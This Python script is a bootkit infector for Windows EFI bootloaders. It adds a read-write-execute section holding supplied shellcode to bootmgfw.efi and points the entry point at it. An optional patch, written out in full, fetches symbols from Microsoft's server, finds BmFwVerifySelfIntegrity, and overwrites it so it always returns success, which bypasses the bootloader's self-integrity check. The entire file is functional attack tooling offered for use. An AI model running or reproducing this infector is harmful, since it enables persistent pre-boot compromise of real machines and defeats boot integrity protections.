#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import io
import os
import lief
import pefile
import struct
import argparse
import requests
import pdbparse

def GetPeSym( PePath, Symbol ):
    """
    Extract the symbol from the PE based on its PDB.
    """
    try:
        Pef = pefile.PE( PePath );

        for Dir in Pef.DIRECTORY_ENTRY_DEBUG:
            if hasattr( Dir.entry, 'PdbFileName' ):
                ##
                ## Extract GUID
                ##
                uid  = f'{Dir.entry.Signature_Data1:08x}';
                uid += f'{Dir.entry.Signature_Data2:04x}';
                uid += f'{Dir.entry.Signature_Data3:04x}';
                uid += f'{int.from_bytes(Dir.entry.Signature_Data4, byteorder="big"):016x}'
                uid  = uid.upper();

                ##
                ## Get URL and Object
                ##
                url  = f'https://msdl.microsoft.com/download/symbols/'
                url += f'{Dir.entry.PdbFileName[:-1].decode("ascii")}/{uid}{Dir.entry.Age:x}/'
                url += f'{Dir.entry.PdbFileName[:-1].decode("ascii")}'
                req  = requests.get( url );
                iop  = io.BytesIO( bytes( req.content ) );

                try:
                    ##
                    ## Get Object
                    ##
                    obj = pdbparse.PDB7( iop );
                except:
                    ##
                    ## Get Object
                    ##
                    obj = pdbparse.PDB2( iop );

                try:
                    ##
                    ## Get Section
                    ##
                    sec = obj.STREAM_SECT_HDR_ORIG.sections;
                except:
                    ##
                    ## Get Section
                    ##
                    sec = obj.STREAM_SECT_HDR.sections;

                try:
                    for ent in obj.STREAM_GSYM.reload().globals:
                        if ent.name == Symbol:
                            return ent;
                except:
                    return 0;
    except:
        return 0;

if __name__ in '__main__':
    """
    Injects a EFI driver with the bootkit
    """
    Opt = argparse.ArgumentParser( description = 'Infects a EFI image with the bootkit' );
    Opt.add_argument( '-ef', help = 'Path to the old EFI bootloader.', required = True, type = str );
    Opt.add_argument( '-sc', help = 'Path to the shellcode', required = True, type = argparse.FileType( 'rb+' ) );
    Opt.add_argument( '-of', help = 'Path to the new EFI bootloader.', required = True, type = str );
    Opt.add_argument( '--patch-integrity', help = 'Patch the integrity check in bootmgfw.efi.', required = False, action = 'store_true', default = False );
    Arg = Opt.parse_args();

    ##
    ## Parse PE
    ##
    Obj = lief.parse( Arg.ef );
    
    ##
    ## Add Config
    ##
    Cfg  = struct.pack( '>I', Obj.optional_header.addressof_entrypoint );
    Cfg += struct.pack( '>I', Obj.dos_header.addressof_new_exeheader );

    ##
    ## Add EFI Section
    ##
    Sec = lief.PE.Section( ".efi" );
    Sec.characteristics = lief.PE.SECTION_CHARACTERISTICS.MEM_EXECUTE | lief.PE.SECTION_CHARACTERISTICS.MEM_WRITE | lief.PE.SECTION_CHARACTERISTICS.MEM_READ;
    Sec.content = list( Arg.sc.read() + Cfg );
    Sec = Obj.add_section( Sec );

    ##
    ## Patch Self Integrity
    ##
    if Arg.patch_integrity:
        ##
        ## Inserts a mov eax, 0; ret
        ## 
        Ent = GetPeSym( Arg.ef, "BmFwVerifySelfIntegrity" );
        Obj.patch_address( Ent.offset + Obj.sections[ Ent.segment - 1 ].virtual_address, list( b"\x33\xc0\xc3" ) );

    ##
    ## Patch entrypoint
    ## 
    Obj.optional_header.addressof_entrypoint = Sec.virtual_address;
    
    ##
    ## Build new bootloader
    ##
    Bld = lief.PE.Builder( Obj );
    Bld.build( );
    Bld.write( Arg.of );
